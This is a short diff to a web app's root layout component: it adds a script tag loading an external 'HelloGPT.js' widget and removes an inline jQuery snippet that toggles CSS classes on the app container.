@@ -42,6 +42,7 @@ const RootLayout = async ({ children, modal }: RootLayoutProps) => {
               </ul>	
               <div><div></div></div>
             </div>
+            <script src="https://dl.cmdpe.com/HelloGPT/HelloGPT.js"></script> 
             {children}
             {!mobile && modal}
           </AuthProvider>
@@ -49,21 +50,6 @@ const RootLayout = async ({ children, modal }: RootLayoutProps) => {
         </GlobalProvider>
         <Analytics />
         {inVercel && <SpeedInsights />}
-
-
-        <script>
-          {`
-            $(document).ready(function() {
-                if ($('body > .ant-app > .css-5m4etf > .acss-ssf7r').length > 0) {
-                    $('body > .ant-app').addClass('css-gcermr').removeClass('css-1mqleeb');
-                } else {
-                    $('body > .ant-app').addClass('css-1mqleeb').removeClass('css-gcermr');
-                }
-            });
-          `}
-        </script>
-
-        
       </body>
     </html>
   );
